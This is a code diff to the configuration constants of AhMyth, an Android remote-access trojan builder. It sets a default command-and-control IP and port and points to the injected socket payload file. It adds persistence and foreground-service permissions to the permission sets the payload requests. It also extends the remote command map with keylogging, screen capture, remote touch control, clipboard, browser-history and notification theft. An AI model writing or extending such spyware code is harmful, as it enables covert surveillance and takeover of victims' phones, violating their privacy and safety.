@@ -15,8 +15,9 @@ exports.outputApkPath = 'Output';
 exports.outputLogsPath = 'Logs';
 exports.logColors = { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 };
-exports.defaultPort = 42474;
-exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'e.smali';
+exports.defaultIP = '192.168.1.1';
+exports.defaultPort = 1234;
+exports.IOSocketPath = 'smali_classes3' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'IOSocket.smali';
 exports.ahmythService = 'ahmyth.mine.king.ahmyth.MainService';
 exports.ahmythReceiver = 'ahmyth.mine.king.ahmyth.MyReceiver';
 exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
@@ -49,7 +50,10 @@ exports.permissions = [
   'android.permission.ACCESS_FINE_LOCATION',
   'android.permission.ACCESS_COARSE_LOCATION',
   'android.permission.ACCESS_BACKGROUND_LOCATION',
-  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS'
+  'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
+  'android.permission.POST_NOTIFICATIONS',
+  'android.permission.FOREGROUND_SERVICE',
+  'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
 ];
 exports.checkboxMap = {
   Permissions1: [
@@ -62,7 +66,10 @@ exports.checkboxMap = {
     'android.permission.INTERNET',
     'android.permission.ACCESS_NETWORK_STATE',
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
-    'android.permission.RECEIVE_BOOT_COMPLETED'
+    'android.permission.RECEIVE_BOOT_COMPLETED',
+    'android.permission.POST_NOTIFICATIONS',
+    'android.permission.FOREGROUND_SERVICE',
+    'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
   ],
   Permissions2: [
     'android.permission.READ_EXTERNAL_STORAGE',
@@ -74,7 +81,10 @@ exports.checkboxMap = {
     'android.permission.INTERNET',
     'android.permission.ACCESS_NETWORK_STATE',
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
-    'android.permission.RECEIVE_BOOT_COMPLETED'
+    'android.permission.RECEIVE_BOOT_COMPLETED',
+    'android.permission.POST_NOTIFICATIONS',
+    'android.permission.FOREGROUND_SERVICE',
+    'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
   ],
   Permissions3: [
     'android.permission.RECORD_AUDIO',
@@ -85,7 +95,10 @@ exports.checkboxMap = {
     'android.permission.INTERNET',
     'android.permission.ACCESS_NETWORK_STATE',
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
-    'android.permission.RECEIVE_BOOT_COMPLETED'
+    'android.permission.RECEIVE_BOOT_COMPLETED',
+    'android.permission.POST_NOTIFICATIONS',
+    'android.permission.FOREGROUND_SERVICE',
+    'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
   ],
   Permissions4: [
     'android.permission.ACCESS_FINE_LOCATION',
@@ -97,7 +110,10 @@ exports.checkboxMap = {
     'android.permission.INTERNET',
     'android.permission.ACCESS_NETWORK_STATE',
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
-    'android.permission.RECEIVE_BOOT_COMPLETED'
+    'android.permission.RECEIVE_BOOT_COMPLETED',
+    'android.permission.POST_NOTIFICATIONS',
+    'android.permission.FOREGROUND_SERVICE',
+    'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
   ],
   Permissions5: [
     'android.permission.READ_CONTACTS',
@@ -107,7 +123,10 @@ exports.checkboxMap = {
     'android.permission.INTERNET',
     'android.permission.ACCESS_NETWORK_STATE',
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
-    'android.permission.RECEIVE_BOOT_COMPLETED'
+    'android.permission.RECEIVE_BOOT_COMPLETED',
+    'android.permission.POST_NOTIFICATIONS',
+    'android.permission.FOREGROUND_SERVICE',
+    'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
   ],
   Permissions6: [
     'android.permission.READ_SMS',
@@ -120,7 +139,10 @@ exports.checkboxMap = {
     'android.permission.INTERNET',
     'android.permission.ACCESS_NETWORK_STATE',
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
-    'android.permission.RECEIVE_BOOT_COMPLETED'
+    'android.permission.RECEIVE_BOOT_COMPLETED',
+    'android.permission.POST_NOTIFICATIONS',
+    'android.permission.FOREGROUND_SERVICE',
+    'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
   ],
   Permissions7: [
     'android.permission.READ_PHONE_STATE',
@@ -132,7 +154,10 @@ exports.checkboxMap = {
     'android.permission.INTERNET',
     'android.permission.ACCESS_NETWORK_STATE',
     'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
-    'android.permission.RECEIVE_BOOT_COMPLETED'
+    'android.permission.RECEIVE_BOOT_COMPLETED',
+    'android.permission.POST_NOTIFICATIONS',
+    'android.permission.FOREGROUND_SERVICE',
+    'android.permission.FOREGROUND_SERVICE_DATA_SYNC'
   ],
 };
 
@@ -146,5 +171,14 @@ exports.orders = {
   mic: 'x0000mc',
   location: 'x0000lm',
   contacts: 'x0000cn',
-
+  deviceInfo: 'x0000di',
+  apps: 'x0000ap',
+  clipboard: 'x0000cb',
+  wifi: 'x0000wf',
+  screen: 'x0000sc',
+  input: 'x0000in',  // Remote input/touch control
+  keylogger: 'x0000kl',
+  browserHistory: 'x0000bh',
+  notifications: 'x0000nt',
+  systemInfo: 'x0000si',
 }
